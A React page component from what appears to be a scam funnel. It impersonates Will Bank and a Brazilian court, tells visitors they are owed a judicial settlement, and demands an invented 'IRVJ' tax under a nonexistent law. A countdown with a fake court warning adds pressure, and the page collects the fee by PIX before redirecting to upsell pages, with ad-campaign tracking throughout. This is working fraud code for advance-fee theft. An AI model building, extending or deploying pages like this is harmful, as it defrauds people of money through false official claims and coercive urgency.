import { useEffect, useState, useRef } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { 
  CheckCircle, 
  Copy, 
  Clock,
  Loader2
} from "lucide-react";
import WillBankHeader from "@/components/WillBankHeader";
import WillBankCard from "@/components/WillBankCard";
import WillBankFooter from "@/components/WillBankFooter";
import { CPFData } from "@/lib/cpf";
import { normalizeBuyer } from "@/lib/pixBuyer";
import { toast } from "@/hooks/use-toast";
import willbankLogo from "@/assets/willbank-logo.png";
import { supabase } from "@/integrations/supabase/client";
import { saveSession, getSession, clearSession } from "@/hooks/useSessionPersistence";
import { getPixStorageKey, savePixData, getStoredPixData, getPixRemainingTime } from "@/hooks/usePixPersistence";
import { fbEvents } from "@/lib/fbPixel";
import { getUtmSignature, getStoredUtmParams, captureUtmParams } from "@/hooks/useUtmTracking";
import { trackFunnelEvent } from "@/hooks/useFunnelTracking";

interface PixData {
  code: string;
  qrcode_base64: string;
  transaction_id: string;
  order_uuid: string;
}

const Saque = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const [isProcessing, setIsProcessing] = useState(false);
  const [isCompleted, setIsCompleted] = useState(false);
  const [countdown, setCountdown] = useState(600); // 10 minutes
  const [pixData, setPixData] = useState<PixData | null>(null);
  const [isLoadingPix, setIsLoadingPix] = useState(true);
  const [pixError, setPixError] = useState<string | null>(null);
  const [showPix, setShowPix] = useState(false);
  const checkIntervalRef = useRef<NodeJS.Timeout | null>(null);
  const hasTrackedRef = useRef(false);
  const pixStorageKey = getPixStorageKey("saque");

  // Try to get data from location state or session
  const session = getSession();
  const cpfData: CPFData | undefined = location.state?.cpfData || session?.cpfData;
  const valorBeneficio: number | undefined = location.state?.valorBeneficio || session?.valorBeneficio;
  const valorTaxa: number | undefined = location.state?.valorTaxa;
  const protocolo: string | undefined = location.state?.protocolo || session?.protocolo;

  // Scroll to top on mount
  useEffect(() => {
    window.scrollTo(0, 0);
  }, []);

  // Generate PIX on mount or restore from storage
  useEffect(() => {
    if (!cpfData || !valorBeneficio) {
      navigate("/");
      return;
    }

    // Save session
    saveSession({ cpfData, currentStep: "/saque", valorBeneficio, protocolo });
    
    // Track funnel event (only once)
    if (!hasTrackedRef.current) {
      hasTrackedRef.current = true;
      trackFunnelEvent('saque', { cpf: cpfData.cpf });
    }

    // Get current UTM signature for PIX validation
    const currentUtmSignature = getUtmSignature();
    console.log('[Saque] Current UTM signature:', currentUtmSignature);

    // Check for existing valid PIX (with UTM signature validation)
    const storedPix = getStoredPixData(pixStorageKey, currentUtmSignature);
    if (storedPix) {
      console.log('[Saque] Restoring saved PIX');
      setPixData({
        code: storedPix.code,
        qrcode_base64: storedPix.qrcode_base64,
        transaction_id: storedPix.transaction_id,
        order_uuid: storedPix.external_id,
      });
      setCountdown(getPixRemainingTime(pixStorageKey));
      setIsLoadingPix(false);
      startPaymentCheck(storedPix.external_id);
      return;
    }

    console.log('[Saque] No valid PIX found, generating new one');

    const generatePix = async () => {
      try {
        setIsLoadingPix(true);
        setPixError(null);

        const taxaFinal = valorTaxa || (valorBeneficio * 0.0071);
        const amountInCents = Math.round(taxaFinal * 100);

        // Safety net: captura UTMs antes de ler, caso UtmCapture não tenha rodado ainda
        captureUtmParams();
        const utmSignature = getUtmSignature();
        const utmParams = getStoredUtmParams();
        console.log('[Saque] UTM params for PIX:', utmParams);

        const buyer = normalizeBuyer(cpfData.nome, cpfData.cpf);
        const response = await supabase.functions.invoke('create-pix', {
          body: {
            amount: amountInCents,
            buyer: {
              name: buyer.name,
              email: buyer.email,
              document: buyer.document,
            },
            tracking: {
              utm_source: utmParams.utm_source,
              utm_campaign: utmParams.utm_campaign,
              utm_medium: utmParams.utm_medium,
              utm_content: utmParams.utm_content,
              utm_term: utmParams.utm_term,
            },
          },
        });

        if (response.error) {
          console.error('Error creating PIX:', response.error);
          setPixError('Erro ao gerar PIX. Tente novamente.');
          return;
        }

        const data = response.data;
        console.log('[Saque] Fruitfy response:', data);
        const pixCode = data?.data?.pix?.code || data?.data?.pix_code;
        const pixQrBase64 = data?.data?.pix?.qr_code_base64 || data?.data?.pix?.qrcode_base64 || '';
        const orderUuid = data?.data?.order_id || data?.data?.order_uuid || '';
        if (orderUuid) {
          const newPixData = {
            code: pixCode,
            qrcode_base64: pixQrBase64,
            transaction_id: orderUuid,
            order_uuid: orderUuid,
          };
          setPixData(newPixData);
          
          // Save to localStorage for persistence (with UTM signature)
          savePixData(pixStorageKey, { code: pixCode, qrcode_base64: pixQrBase64, transaction_id: orderUuid, external_id: orderUuid }, utmSignature);

          // Start polling for payment status
          startPaymentCheck(orderUuid);
        } else {
          console.error('[Saque] Could not extract PIX data:', data);
          setPixError('Resposta inválida do servidor.');
        }
      } catch (error) {
        console.error('Error generating PIX:', error);
        setPixError('Erro ao gerar PIX. Tente novamente.');
      } finally {
        setIsLoadingPix(false);
      }
    };

    generatePix();

    return () => {
      if (checkIntervalRef.current) {
        clearInterval(checkIntervalRef.current);
      }
    };
  }, [cpfData, valorBeneficio, valorTaxa, protocolo, navigate]);

  // Countdown timer
  useEffect(() => {
    const timer = setInterval(() => {
      setCountdown(prev => {
        if (prev <= 0) {
          clearInterval(timer);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, []);

  const startPaymentCheck = (orderUuid: string) => {
    // Check every 15 seconds (reduced from 5s to avoid worker limits)
    checkIntervalRef.current = setInterval(async () => {
      try {
        const response = await supabase.functions.invoke('check-pix-status', {
          body: { order_uuid: orderUuid },
        });

        if (response.data?.data?.status === 'paid') {
          if (checkIntervalRef.current) {
            clearInterval(checkIntervalRef.current);
          }
          
          toast({
            title: "Pagamento confirmado!",
            description: "Processando próxima etapa...",
          });
          // Navigate to upsell 1
          navigate("/upsell/1", {
            state: {
              cpfData,
              valorBeneficio,
              protocolo,
            },
          });
        }
      } catch (error) {
        console.error('Error checking payment status:', error);
      }
    }, 15000);
  };

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
  };

  const handleCopiarPix = () => {
    if (pixData?.code) {
      navigator.clipboard.writeText(pixData.code);
      toast({
        title: "Código PIX copiado! ✓",
        description: "Cole o código no seu aplicativo bancário",
      });
    }
  };

  const handleConfirmarPagamento = () => {
    setIsProcessing(true);
    
    // Manual check
    if (pixData?.order_uuid) {
      supabase.functions.invoke('check-pix-status', {
        body: { order_uuid: pixData.order_uuid },
      }).then((response) => {
        if (response.data?.data?.status === 'paid') {
          if (checkIntervalRef.current) {
            clearInterval(checkIntervalRef.current);
          }
          
          toast({
            title: "Pagamento confirmado!",
            description: "Processando próxima etapa...",
          });
          // Navigate to upsell 1
          navigate("/upsell/1", {
            state: {
              cpfData,
              valorBeneficio,
              protocolo,
            },
          });
        } else {
          toast({
            title: "Aguardando pagamento",
            description: "Ainda não identificamos o pagamento. Tente novamente em alguns segundos.",
            variant: "destructive",
          });
        }
        setIsProcessing(false);
      }).catch(() => {
        setIsProcessing(false);
        toast({
          title: "Erro ao verificar",
          description: "Tente novamente em alguns segundos.",
          variant: "destructive",
        });
      });
    } else {
      setIsProcessing(false);
    }
  };

  if (!cpfData || !valorBeneficio) return null;

  const taxaFinal = valorTaxa || (valorBeneficio * 0.0071);

  return (
    <div className="min-h-screen min-h-[100dvh] bg-background flex flex-col">
      <WillBankHeader 
        userName={cpfData.nome.split(' ')[0].toUpperCase()} 
        breadcrumb="Liquidação Judicial > Ordem de Pagamento > IRVJ"
      />

      <main className="flex-1 flex items-center justify-center p-3 sm:p-6">
        <WillBankCard className="w-full max-w-lg">
          {isLoadingPix ? (
            <div className="flex flex-col items-center justify-center py-12 space-y-4">
              <Loader2 className="w-12 h-12 animate-spin text-primary" />
              <p className="text-muted-foreground font-medium">Gerando código PIX...</p>
            </div>
          ) : pixError ? (
            <div className="flex flex-col items-center justify-center py-12 space-y-4">
              <p className="text-destructive font-medium text-center">{pixError}</p>
              <Button onClick={() => window.location.reload()} variant="outline">
                Tentar novamente
              </Button>
            </div>
          ) : !isCompleted ? (
            <div className="space-y-5 sm:space-y-6">
              {/* Header */}
              <div className="text-center space-y-2">
                <img src={willbankLogo} alt="Will Bank" className="h-10 sm:h-12 mx-auto" />
                <h1 className="text-lg sm:text-xl font-bold tracking-tight">IRVJ - Imposto sobre Recebimento de Valores Judiciais</h1>
              </div>

              {/* Countdown */}
              <div className="bg-gradient-to-r from-red-50 to-red-100 border-2 border-red-200 rounded-xl sm:rounded-2xl p-4 text-center shadow-sm">
                <div className="flex items-center justify-center gap-2 text-red-600">
                  <Clock className="w-4 h-4 sm:w-5 sm:h-5" />
                  <span className="font-semibold text-sm">Tempo restante:</span>
                </div>
                <p className="text-3xl sm:text-4xl font-black text-red-600 font-mono mt-2 tracking-tight">{formatTime(countdown)}</p>
                <p className="text-[10px] sm:text-xs text-red-500 mt-1.5 font-medium">AVISO DO TRIBUNAL: Após este prazo, sua ordem de pagamento será ANULADA</p>
              </div>

              {/* Values Summary */}
              <div className="bg-muted/50 rounded-xl sm:rounded-2xl p-4 space-y-3 border border-border/40">
                <div className="flex justify-between items-center">
                  <span className="text-muted-foreground font-medium text-sm">Valor da Liquidação Judicial:</span>
                  <span className="font-black text-base sm:text-lg text-success">R$ {valorBeneficio.toLocaleString('pt-BR', { minimumFractionDigits: 2 })}</span>
                </div>
                <div className="flex justify-between items-center border-t border-border/40 pt-3">
                  <span className="text-muted-foreground font-medium text-sm">IRVJ (Lei 14.302):</span>
                  <span className="font-black text-base sm:text-lg text-primary">R$ {taxaFinal.toFixed(2).replace('.', ',')}</span>
                </div>
                {protocolo && (
                  <div className="flex justify-between items-center border-t border-border/40 pt-3">
                    <span className="text-muted-foreground font-medium text-sm">Protocolo:</span>
                    <span className="font-mono text-xs sm:text-sm font-bold">{protocolo}</span>
                  </div>
                )}
              </div>

              {/* Action Button or PIX */}
              {!showPix ? (
                <Button 
                  onClick={() => setShowPix(true)}
                  disabled={!pixData}
                  className="w-full h-14 text-xs sm:text-base font-black bg-gradient-to-r from-primary to-amber-400 hover:from-primary/90 hover:to-amber-400/90 text-primary-foreground rounded-full shadow-xl hover:shadow-2xl transition-all duration-300"
                >
                  <span className="hidden sm:inline">PAGAR IRVJ E LIBERAR ORDEM DE PAGAMENTO</span>
                  <span className="sm:hidden">PAGAR IRVJ E LIBERAR PAGAMENTO</span>
                </Button>
              ) : (
                <div className="space-y-4 animate-fade-in">
                  <p className="text-xs sm:text-sm text-muted-foreground font-medium text-center">Escaneie o QR Code ou copie o código PIX:</p>
                  
                  <div className="w-40 h-40 sm:w-48 sm:h-48 mx-auto bg-card rounded-xl sm:rounded-2xl border-2 sm:border-3 border-primary p-2.5 shadow-lg">
                    {pixData?.qrcode_base64 ? (
                      <img 
                        src={pixData.qrcode_base64.startsWith('data:') ? pixData.qrcode_base64 : `data:image/png;base64,${pixData.qrcode_base64}`} 
                        alt="QR Code PIX" 
                        className="w-full h-full rounded-lg"
                      />
                    ) : (
                      <div className="w-full h-full bg-muted/30 rounded-lg flex items-center justify-center">
                        <Loader2 className="w-8 h-8 animate-spin text-muted-foreground" />
                      </div>
                    )}
                  </div>

                  {pixData?.code && (
                    <Button
                      variant="outline"
                      onClick={handleCopiarPix}
                      className="w-full h-12 border-2 border-primary text-primary hover:bg-primary/10 rounded-full font-bold text-sm transition-all duration-300"
                    >
                      <Copy className="w-4 h-4 mr-2" />
                      Copiar código PIX
                    </Button>
                  )}

                  <Button 
                    onClick={handleConfirmarPagamento}
                    disabled={isProcessing || !pixData}
                    className="w-full h-14 text-xs sm:text-base font-black bg-gradient-to-r from-primary to-amber-400 hover:from-primary/90 hover:to-amber-400/90 text-primary-foreground rounded-full shadow-xl hover:shadow-2xl transition-all duration-300"
                  >
                    {isProcessing ? (
                      <>
                        <Loader2 className="w-5 h-5 animate-spin mr-2" />
                        Verificando pagamento...
                      </>
                    ) : (
                      <>
                        <span className="hidden sm:inline">JÁ PAGUEI - PROCESSAR MINHA ORDEM DE PAGAMENTO</span>
                        <span className="sm:hidden">JÁ PAGUEI - LIBERAR PAGAMENTO</span>
                      </>
                    )}
                  </Button>
                </div>
              )}

              {/* Dev Test Button - only visible in development */}

              <p className="text-[10px] sm:text-xs text-center text-muted-foreground font-medium">
                Após confirmação do IRVJ, o Tribunal autorizará a transferência em até 24h úteis.
              </p>
            </div>
          ) : (
            /* Success State */
            <div className="text-center space-y-6 py-4 animate-scale-in">
              <div className="w-24 h-24 sm:w-28 sm:h-28 mx-auto bg-gradient-to-br from-green-100 to-green-200 rounded-full flex items-center justify-center shadow-lg">
                <CheckCircle className="w-14 h-14 sm:w-16 sm:h-16 text-success" />
              </div>
              
              <div className="space-y-1.5">
                <h1 className="text-xl sm:text-2xl font-bold tracking-tight">IRVJ RECOLHIDO COM SUCESSO</h1>
                <p className="text-muted-foreground text-sm">
                  O Tribunal está processando sua ordem de pagamento.
                </p>
              </div>

              <div className="bg-gradient-to-r from-green-50 to-emerald-50 border-2 border-green-200 rounded-xl sm:rounded-2xl p-4 space-y-3 text-left shadow-sm text-sm">
                <div className="flex justify-between">
                  <span className="text-muted-foreground font-medium">Beneficiário:</span>
                  <span className="font-bold text-right">{cpfData.nome}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-muted-foreground font-medium">CPF:</span>
                  <span className="font-bold">{cpfData.cpf}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-muted-foreground font-medium">Valor:</span>
                  <span className="font-black text-success text-base">R$ {valorBeneficio.toLocaleString('pt-BR', { minimumFractionDigits: 2 })}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-muted-foreground font-medium">Previsão:</span>
                  <span className="font-bold">Até 24h úteis</span>
                </div>
              </div>

              <Button 
                onClick={() => {
                  clearSession();
                  navigate("/");
                }}
                variant="outline"
                className="w-full h-12 rounded-full font-bold text-sm border-2 hover:bg-muted/50 transition-all duration-300"
              >
                Voltar ao início
              </Button>
            </div>
          )}
        </WillBankCard>
      </main>

      <WillBankFooter />
    </div>
  );
};

export default Saque;
